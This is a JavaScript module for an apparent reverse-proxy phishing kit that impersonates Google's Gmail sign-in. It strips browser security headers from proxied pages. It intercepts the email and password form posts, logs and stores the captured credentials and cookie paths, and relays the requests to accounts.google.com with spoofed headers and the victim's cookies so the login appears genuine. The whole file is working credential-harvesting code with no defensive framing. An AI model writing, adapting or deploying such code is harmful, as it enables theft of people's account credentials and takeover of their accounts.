/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')

// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        return super.processRequest()
    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {
        super(proxyResp, browserEndPoint, configExport.EXTERNAL_FILTERS)
        this.regexes = []
    }

    processResponse(clientContext) {
        this.browserEndPoint.removeHeader('X-Frame-Options')
        this.browserEndPoint.removeHeader('Content-Security-Policy')
        this.browserEndPoint.removeHeader('X-Content-Type-Options')
        this.browserEndPoint.removeHeader('X-XSS-Protection')

        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }

        return super.processResponse(clientContext)
    }

    concludeAuth() {
        console.log('Gmail login completed successfully')
    }
}

const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true
    }

    execute(clientContext) {
        // Handle Gmail login flow - direct approach
        console.log('Gmail request:', this.req.url, this.req.method)
        
        // For POST requests to password endpoint, capture password and forward to Gmail
        if (this.req.method === 'POST' && this.req.url.includes('/v3/signin/challenge/pwd')) {
            let body = ''
            this.req.on('data', (chunk) => {
                body += chunk.toString()
            })
            this.req.on('end', () => {
                // Extract password from form data
                const passwordMatch = /password=([^&]+)/.exec(body)
                if (passwordMatch) {
                    const password = decodeURIComponent(passwordMatch[1])
                    console.log('Password captured:', password)
                    Object.assign(clientContext.sessionBody, { password: password })
                }
                
                // Forward the request to Gmail with proper headers
                const requestOptions = {
                    hostname: 'accounts.google.com',
                    port: 443,
                    path: this.req.url,
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Content-Length': body.length,
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
                        'Origin': 'https://accounts.google.com',
                        'Referer': 'https://accounts.google.com/',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Accept-Encoding': 'gzip, deflate, br, zstd',
                        'Cache-Control': 'max-age=0',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'same-origin',
                        'Sec-Fetch-User': '?1',
                        'Upgrade-Insecure-Requests': '1',
                        'Cookie': this.req.headers.cookie || '',
                        'Host': 'accounts.google.com'
                    }
                }
                
                const https = require('https')
                const gmailReq = https.request(requestOptions, (gmailRes) => {
                    console.log('Gmail password response data:', gmailRes.data)
                    
                    // Forward Gmail response to user
                    this.res.writeHead(gmailRes.statusCode, gmailRes.headers)
                    gmailRes.pipe(this.res)
                })
                
                gmailReq.on('error', (err) => {
                    console.error('Gmail password request error:', err)
                    this.res.writeHead(500)
                    this.res.end('Error connecting to Gmail')
                })
                
                gmailReq.write(body)
                gmailReq.end()
            })
            return
        }

        // For POST requests to identifier endpoint, capture email and forward to Gmail
        if (this.req.method === 'POST' && this.req.url.includes('/v3/signin/identifier')) {
            let body = ''
            this.req.on('data', (chunk) => {
                body += chunk.toString()
            })
            this.req.on('end', () => {
                // Extract email from form data
                const emailMatch = /identifier=([^&]+)/.exec(body)
                if (emailMatch) {
                    const email = decodeURIComponent(emailMatch[1])
                    console.log('Email captured:', email)
                    Object.assign(clientContext.sessionBody, { email: email })
                }
                
                // Forward the request to Gmail with proper headers
                const requestOptions = {
                    hostname: 'accounts.google.com',
                    port: 443,
                    path: this.req.url,
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Content-Length': body.length,
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
                        'Origin': 'https://accounts.google.com',
                        'Referer': 'https://accounts.google.com/',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Accept-Encoding': 'gzip, deflate, br, zstd',
                        'Cache-Control': 'max-age=0',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'same-origin',
                        'Sec-Fetch-User': '?1',
                        'Upgrade-Insecure-Requests': '1',
                        'Cookie': this.req.headers.cookie || '',
                        'Host': 'accounts.google.com'
                    }
                }
                
                const https = require('https')
                const gmailReq = https.request(requestOptions, (gmailRes) => {
                    console.log('Gmail response status:', gmailRes.statusCode, gmailRes.statusMessage)
                    
                    // If Gmail redirects to password form, follow the redirect
                    if (gmailRes.statusCode === 302 && gmailRes.headers.location) {
                        const redirectUrl = gmailRes.headers.location
                        console.log('Gmail redirect:', redirectUrl)
                        
                        if (redirectUrl.includes('/v3/signin/challenge/pwd')) {
                            // Redirect to password form
                            this.res.writeHead(302, {
                                'Location': redirectUrl.replace('https://accounts.google.com', '')
                            })
                            this.res.end()
                            return
                        }
                    }
                    
                    // Forward Gmail response to user
                    this.res.writeHead(gmailRes.statusCode, gmailRes.headers)
                    gmailRes.pipe(this.res)
                })
                
                gmailReq.on('error', (err) => {
                    console.error('Gmail request error:', err)
                    this.res.writeHead(500)
                    this.res.end('Error connecting to Gmail')
                })
                
                gmailReq.write(body)
                gmailReq.end()
            })
            return
        }
        
        // For all other requests, use default handling
        return super.execute(clientContext)
    }
}

const configExport = {
    SCHEME: 'gmail',

    CURRENT_DOMAIN: 'accounts.google.com',

    AUTOGRAB_CODE: 'identifier',

    START_PATH: '/v3/signin/identifier?hl=en',

    COOKIE_PATH: ['/v3/signin/identifier', '/v3/signin/challenge/pwd'],

    EXIT_TRIGGER_PATH: [],

    EXIT_URL: 'https://myaccount.google.com/',

    EXTRA_COMMANDS: [],

    PRE_HANDLERS: [],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        gmailEmail: {
            method: 'POST',
            params: ['identifier'],
            urls: '',
            hosts: ['accounts.google.com'],
        },

        gmailPassword: {
            method: 'POST',
            params: ['password', 'hiddenPassword'],
            urls: '',
            hosts: ['accounts.google.com'],
        },
    },

    //MODULE OPTIONS 
    MODULE_ENABLED: true,

    MODULE_OPTIONS: {
        startPath: this.START_PATH,
        exitLink: '',
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport